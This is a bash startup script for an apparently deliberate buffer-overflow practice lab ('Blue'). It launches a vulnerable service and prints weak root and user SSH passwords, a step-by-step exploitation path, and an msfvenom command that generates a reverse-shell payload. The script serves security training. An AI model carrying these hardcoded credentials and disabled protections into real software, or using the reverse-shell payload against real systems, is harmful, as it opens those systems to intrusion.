#!/bin/bash
# Service startup script for Blue OSCP machine
# Starts SSH and vulnerable buffer overflow service

echo "Starting Blue Machine Services..."
echo "=================================="

# Start SSH service
echo "Starting SSH service..."
service ssh start
if [ $? -eq 0 ]; then
    echo "✓ SSH service started successfully"
else
    echo "✗ Failed to start SSH service"
fi

# Start the vulnerable buffer overflow service
echo "Starting vulnerable buffer overflow service..."
/opt/blue/vulnerable-service &
VULN_SERVICE_PID=$!
echo "✓ Vulnerable service started (PID: $VULN_SERVICE_PID) on port 9999"

# Display machine information
echo ""
echo "=================================="
echo "BLUE MACHINE - BUFFER OVERFLOW LAB"
echo "=================================="
echo ""
echo "Machine Information:"
echo "  Name: Blue"
echo "  OS: Windows 7 (Simulated)"
echo "  Vulnerability: Stack Buffer Overflow"
echo "  IP: 10.11.{user_id}.11"
echo ""
echo "Services Running:"
echo "  - SSH (Port 22) - root:toor, john:john123"
echo "  - Vulnerable Service (Port 9999) - Buffer Overflow Target"
echo ""
echo "Exploitation Path:"
echo "  1. Enumerate with nmap: nmap -sC -sV -oA blue 10.11.{user_id}.11"
echo "  2. Connect to service: nc 10.11.{user_id}.11 9999"
echo "  3. Send HELP command to understand the service"
echo "  4. Send STATUS to see vulnerability details"
echo "  5. Create buffer overflow payload with msfvenom"
echo "  6. Exploit buffer overflow to get shell"
echo ""
echo "Buffer Overflow Details:"
echo "  - Buffer Size: 1024 bytes"
echo "  - Stack Protection: DISABLED"
echo "  - ASLR: DISABLED"
echo "  - DEP/NX: DISABLED"
echo "  - Offset: ~1036 bytes (find with pattern_create)"
echo ""
echo "Flags Location:"
echo "  - User flag: /home/john/Desktop/local.txt"
echo "  - Root flag: /root/Desktop/proof.txt"
echo ""
echo "Learning Objectives:"
echo "  ✓ Buffer overflow vulnerability identification"
echo "  ✓ EIP control and offset calculation"
echo "  ✓ Bad character identification"
echo "  ✓ Shellcode generation and injection"
echo "  ✓ Gaining shell access via buffer overflow"
echo ""
echo "Buffer Overflow Commands:"
echo "  - Pattern Create: msf-pattern_create -l 1200"
echo "  - Pattern Offset: msf-pattern_offset -q <EIP_value>"
echo "  - Generate Shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\\x00' -f python"
echo ""
echo "=================================="
echo "Ready for Buffer Overflow Practice! 💥"
echo "=================================="

# Keep services running
wait